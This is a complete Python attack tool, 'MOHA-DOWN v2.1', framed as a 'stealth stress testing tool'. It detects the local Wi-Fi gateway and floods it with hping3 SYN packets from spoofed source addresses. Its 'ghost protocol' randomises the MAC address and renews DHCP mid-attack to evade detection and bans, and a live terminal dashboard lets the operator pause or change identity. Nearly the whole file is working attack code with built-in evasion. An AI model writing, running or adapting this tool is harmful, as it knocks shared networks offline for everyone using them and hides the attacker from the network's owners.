#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MOHA-DOWN v2.1 - Advanced Stealth Stress Testing Tool
Commissioned by The Professor for advanced network resilience assessment.
YOLO Mode: Active
"""

import os
import re
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime, timedelta

try:
    from pynput import keyboard
    from rich.console import Console
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.table import Table
    from rich.text import Text
except ImportError:
    print("Error: Required libraries 'rich' and 'pynput' are not installed.")
    print("Please run: sudo apt install python3-rich python3-pynput")
    sys.exit(1)

# --- Global State Management ---
class AppState:
    def __init__(self):
        self.attack_process = None
        self.target_ip = None
        self.current_mac = "N/A"
        self.user_agent = "N/A (L4 SYN Flood)"
        self.status = "INITIALIZING"
        self.status_color = "bold blue"
        self.shutdown_flag = threading.Event()
        self.start_time = None
        self.console = Console()
        self.ghost_protocol_active = False

    def set_status(self, new_status, color):
        self.status = new_status
        self.status_color = color

state = AppState()

# --- Core Functions ---

def check_dependencies():
    """Verify script is run as root and dependencies are installed."""
    if os.geteuid() != 0:
        state.console.print("[bold red]Error:[/bold red] This script requires root privileges.")
        sys.exit(1)
    
    tools = ["hping3", "macchanger", "ip", "dhclient"]
    for tool in tools:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            state.console.print(f"[bold red]Error:[/bold red] Core tool '{tool}' not found.")
            state.console.print(f"Please install it (e.g., 'sudo apt install {tool} macchanger').")
            sys.exit(1)

def get_mac_address(interface="wlan0"):
    """Gets the current MAC address of an interface."""
    try:
        output = subprocess.check_output(["ip", "link", "show", interface]).decode()
        match = re.search(r"link/ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", output)
        return match.group(1) if match else "N/A"
    except subprocess.CalledProcessError:
        return "Error"

def get_gateway_ip(interface="wlan0"):
    """Automatically detect the gateway IP for a given interface."""
    try:
        output = subprocess.check_output(["ip", "route", "show", "dev", interface], stderr=subprocess.STDOUT).decode()
        match = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", output)
        if match:
            return match.group(1)
        return None
    except subprocess.CalledProcessError:
        return None

def setup_route(target_ip):
    """Add a specific host route to force traffic through wlan0."""
    state.console.print(f"[cyan]Adding strict route for {target_ip} via wlan0...[/cyan]")
    subprocess.run(["sudo", "ip", "route", "del", target_ip], stderr=subprocess.DEVNULL)
    if subprocess.run(["sudo", "ip", "route", "add", target_ip, "dev", "wlan0"]).returncode != 0:
        state.console.print("[bold red]Error:[/bold red] Failed to add IP route.")
        shutdown()

def cleanup_route(target_ip):
    """Remove the specific host route."""
    if target_ip:
        subprocess.run(["sudo", "ip", "route", "del", target_ip], stderr=subprocess.DEVNULL)

def start_attack(target_ip):
    """Launch the hping3 attack in a background process."""
    if not target_ip: return
    command = ["sudo", "hping3", "--flood", "--rand-source", "-p", "80", "-S", target_ip]
    state.console.print(f"[bold red]Launching L4 SYN Flood:[/bold red] {' '.join(command)}")
    try:
        process = subprocess.Popen(command, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        state.attack_process = process
        state.set_status("ATTACKING", "bold green")
        state.start_time = datetime.now()
    except Exception as e:
        state.console.print(f"[bold red]Error launching attack: {e}[/bold red]")
        shutdown()

def ghost_protocol():
    """Handles the entire identity change sequence."""
    if state.ghost_protocol_active:
        return
    state.ghost_protocol_active = True
    
    state.set_status("GHOST PROTOCOL", "bold magenta")
    if state.attack_process:
        try:
            os.killpg(os.getpgid(state.attack_process.pid), signal.SIGSTOP)
        except ProcessLookupError: pass

    state.set_status("CHANGING MAC", "bold blue")
    time.sleep(1)
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "down"])
    mac_output = subprocess.check_output(["sudo", "macchanger", "-r", "wlan0"]).decode()
    new_mac = re.search(r"New MAC:.*(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", mac_output)
    state.current_mac = new_mac.group(1) if new_mac else "Unknown"
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "up"])

    state.set_status("RENEWING IP", "bold cyan")
    time.sleep(1)
    subprocess.run(["sudo", "dhclient", "-r", "wlan0"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "dhclient", "wlan0"], stderr=subprocess.DEVNULL)
    time.sleep(5)

    new_gateway = get_gateway_ip()
    if new_gateway and new_gateway != state.target_ip:
        cleanup_route(state.target_ip)
        state.target_ip = new_gateway
        setup_route(state.target_ip)
    
    state.set_status("ATTACKING", "bold green")
    if state.attack_process:
        try:
            os.killpg(os.getpgid(state.attack_process.pid), signal.SIGCONT)
        except ProcessLookupError: pass

    state.ghost_protocol_active = False

def build_ui():
    """Builds the rich layout."""
    layout = Layout(name="root")
    # SYNTAX ERROR FIX: "footer" is now a keyword argument `name="footer"`
    layout.split(Layout(name="header", size=3), Layout(ratio=1, name="main"), Layout(name="footer", size=3))
    layout["main"].split(Layout(name="top"), Layout(name="bottom"))
    layout["top"].split_row(Layout(name="side"), Layout(name="body", ratio=2))

    header = Panel(Text("MOHA-DOWN v2.1 - Stealth Stress Tool", style="bold magenta", justify="center"), border_style="green", title="[blink]LIVE[/blink]", title_align="right")
    
    info_table = Table.grid(padding=(0, 1))
    info_table.add_column(style="cyan"); info_table.add_column(style="bold yellow")
    info_table.add_row("Target IP:", state.target_ip)
    info_table.add_row("Interface:", "wlan0")
    info_table.add_row("Status:", Text(state.status, style=state.status_color))
    if state.start_time:
        elapsed = datetime.now() - state.start_time
        elapsed -= timedelta(microseconds=elapsed.microseconds)
        info_table.add_row("Elapsed:", str(elapsed))

    identity_table = Table.grid(padding=(0,1))
    identity_table.add_column(style="cyan"); identity_table.add_column(style="bold yellow")
    identity_table.add_row("Current MAC:", state.current_mac)
    identity_table.add_row("Attack Type:", "L4 SYN Flood w/ Spoofed IP")
    
    layout["side"].update(Panel(info_table, title="[bold]Mission Params[/bold]", border_style="blue"))
    layout["bottom"].update(Panel(identity_table, title="[bold]Current Identity[/bold]", border_style="cyan"))

    progress = Progress(SpinnerColumn("line", style="bold cyan"), TextColumn("{task.description}"), BarColumn(None, style="red", complete_style="bright_red"), expand=True)
    progress.add_task("[red]Vector Saturation", total=1000, completed=(int(time.time() * 20) % 1000))
    layout["body"].update(Panel(progress, title="[bold]Live Attack Vector[/bold]", border_style="red"))

    footer = Panel(Text(" [P]ause | [C]ontinue | [R]andomize Identity | [Q]uit ", style="bold white on_black", justify="center"), border_style="yellow")

    layout["header"].update(header)
    layout["footer"].update(footer)
    return layout

def on_press(key):
    if state.ghost_protocol_active: return
    try:
        char = key.char.lower()
        if char == 'p':
            if state.attack_process and state.status == "ATTACKING":
                os.killpg(os.getpgid(state.attack_process.pid), signal.SIGSTOP)
                state.set_status("PAUSED", "bold yellow")
        elif char == 'c':
            if state.attack_process and state.status == "PAUSED":
                os.killpg(os.getpgid(state.attack_process.pid), signal.SIGCONT)
                state.set_status("ATTACKING", "bold green")
        elif char == 'r':
             threading.Thread(target=ghost_protocol, daemon=True).start()
        elif char == 'q':
            shutdown()
    except (AttributeError, ProcessLookupError): pass

def keyboard_listener_func():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def shutdown():
    if state.shutdown_flag.is_set(): return
    state.shutdown_flag.set()
    state.set_status("SHUTTING DOWN", "bold red")
    if state.attack_process:
        try:
            os.killpg(os.getpgid(state.attack_process.pid), signal.SIGKILL)
        except ProcessLookupError: pass
    cleanup_route(state.target_ip)

def main():
    check_dependencies()
    signal.signal(signal.SIGINT, lambda s, f: shutdown())
    signal.signal(signal.SIGTERM, lambda s, f: shutdown())

    state.target_ip = get_gateway_ip()
    if not state.target_ip:
        state.console.print("[bold red]Fatal:[/bold red] Could not determine Gateway IP. Exiting.")
        sys.exit(1)
        
    state.current_mac = get_mac_address()

    try:
        setup_route(state.target_ip)
        start_attack(state.target_ip)
        listener_thread = threading.Thread(target=keyboard_listener_func, daemon=True)
        listener_thread.start()

        with Live(build_ui(), refresh_per_second=10, vertical_overflow="visible") as live:
            while not state.shutdown_flag.is_set():
                live.update(build_ui())
                time.sleep(0.1)
    finally:
        if not state.shutdown_flag.is_set(): shutdown()
        time.sleep(0.5)
        state.console.print("[bold magenta]MOHA-DOWN sequence complete. System state restored.[/bold magenta]")

if __name__ == "__main__":
    main()
